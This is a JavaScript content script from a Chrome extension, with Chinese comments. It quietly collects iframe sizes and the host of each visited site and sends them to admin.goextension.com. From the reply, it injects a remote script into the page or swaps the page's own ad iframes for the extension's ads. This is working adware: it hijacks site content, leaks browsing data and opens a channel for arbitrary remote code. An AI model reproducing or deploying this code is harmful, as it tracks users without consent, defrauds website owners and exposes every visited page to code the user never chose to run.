// 当前网站appid
var appid = '2111201863';
// url
var url = '//admin.goextension.com';
// 创建对象
var htf = {};
/**
 * [htf.extend description] 合并项 htf.extend({a:1,b:2,c:2,d:3},{d:5,f:6,e:70})
 * @param  {[type]} defined [description] 默认选项卡
 * @param  {[type]} options [description] 需要合并选项卡
 * @return {[type]}         [description]
 */
htf.extend = function(defined,options){
    var obj = {};
    for(var key in defined){
        obj[key] = defined[key];
    }

    for(var k in options){
        obj[k] = options[k];
    }
    return obj;
};
/**
 * [join description] 对象转化为字符串  join({a:1,b:2,c:2});
 * @param  {[type]} data [description] 转化对象
 * @return {[type]}      [description]
 */
htf.join = function(data){
    if (!data || typeof data !== 'object') {
        return '';
    }
    var str = '',i = 0;
    for(var key in data){
        if(i == 0) str += key + '=' + data[key];
        else  str += '&' + key + '=' + data[key];
        i++;
    }
    return str;
};
/**
 * [ajax description] 异步请求
 * @return {[type]} [description]
 */
htf.ajax = function(json){
    var timer=null;
    //考虑默认情况
    json=json||{};
    if(!json.url)return;

    json.type = json.type || 'get';
    json.data = json.data || {};

    //创建ajax对象
    if(window.XMLHttpRequest){
        var oAjax=new XMLHttpRequest();
    }else{
        var oAjax=new ActiveXObject('Microsoft.XMLHTTP');
    }
    //打开连接,发送数据
    switch(json.type.toLowerCase()){
        case 'get':
            oAjax.open('GET',json.url+'?' + htf.join( json.data) ,true);
            oAjax.send();
            break;
        case 'post':
            oAjax.open('POST',json.url,true);
            oAjax.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
            oAjax.send( htf.join(json.data) );
            break;
    }
    //接收数据
    oAjax.onreadystatechange=function(){
        if(oAjax.readyState==4){
            clearTimeout(timer);
            if(oAjax.status>=200 && oAjax.status<300 || oAjax.status==304){
                json.success && json.success(oAjax.responseText);
            }else{
                json.error && json.error(oAjax.status);
            }
        }
    };
}

var bFlag = true,
    bAd = true;
;(function isPlug(){
    var oPlug = document.getElementById('chrome_plug_flag_1_0_0');
    if( !oPlug ){
        var oDiv = document.createElement('div');
        oDiv.setAttribute('id', 'chrome_plug_flag_1_0_0');
        oDiv.style.display = 'none';
        oBody = document.getElementsByTagName('body')[0];
        oBody.appendChild( oDiv );
    }else{
        bFlag = false;
    }
})();


if( bFlag ){
    // 超过30次的广告
    chrome.extension.onConnect.addListener(function(port) {
        port.onMessage.addListener(function(aAdId) {
            // 确保广告代码只调用一次
            if( bAd ){
                getAd(aAdId);
                bAd = false;
            }
        });
    });
}
/**
 * [getAd description] 获取广告
 * @return {[type]} [description]
 */
function getAd(aAdId){
    /**
     * 获取页面当中所有的iframe
     * @type {NodeList}
     */
    var oIframe = document.getElementsByTagName('iframe'),
        aIframe = [],   //所有的iframe
        aSize = [];     //iframe大小
    for(var i=0 ; i<oIframe.length ; i++){
        if(oIframe[i].offsetWidth || oIframe[i].offsetHeight){
            aSize.push(oIframe[i].offsetWidth+'*'+oIframe[i].offsetHeight);
            aIframe.push(oIframe[i]);
        }
    }
    //当前网站host
    var web = window.location.host;
    /**
     * @type {size : Array,count : Number,web : string,appid : stringrete : Array}
     * size : iframe尺寸大小
     * count : iframe数量
     * web : 当前网站url
     * appid : appid
     * rate :  超过展示次数的广告
     */
    var data = {
        size : aSize,
        count : aSize.length,
        web : web,
        appid : appid,
        rate : aAdId
    };
    if( aSize ){
        htf.ajax({
            url : url+'/api/get-ad',
            type : 'post',
            data : data,
            success : function(json){
                var json = JSON.parse(json);
                // 40003    没有接收到到参数
                // 40004    没有对应尺寸的广告
                // 40005    该网站在白名单内，不做广告替换
                if( json.code == 40003 || json.code == 40004 || json.code == 40005 )return;
                var data = json.data;
                // js广告
                if( data.type == 1 ){
                    var script = document.createElement('script');
                    script.src = data.list[0];
                    var head = document.getElementsByTagName('head')[0];
                    head.appendChild(script);
                    var adId = data.list['id'];
                    // 获取到广告id以后传给background,background存到localStorage中
                    if( adId ){
                        chrome.extension.sendRequest({adId: adId});
                    }
                    // 配置广告
                }else if( data.type == 2 ){
                    for(var i=0 ; i<data.list.length ; i++){
                        var bFlag = true;
                        var width = data.list[i].size.split('*')[0],
                            height = data.list[i].size.split('*')[1],
                            url = data.list[i].url;

                        for(var j=i ; j<aIframe.length ; j++){
                            var iIframeWidth = aIframe[j].offsetWidth,
                                iIframeHeight = aIframe[j].offsetHeight;
                            if( iIframeWidth == width && iIframeHeight == height && bFlag && !aIframe[j].getAttribute('bFlag') ){
                                aIframe[j].src = url;
                                aIframe[j].setAttribute('bFlag', true);
                                bFlag = false;
                            }
                        }
                    }
                }
            }
        });
    }
}
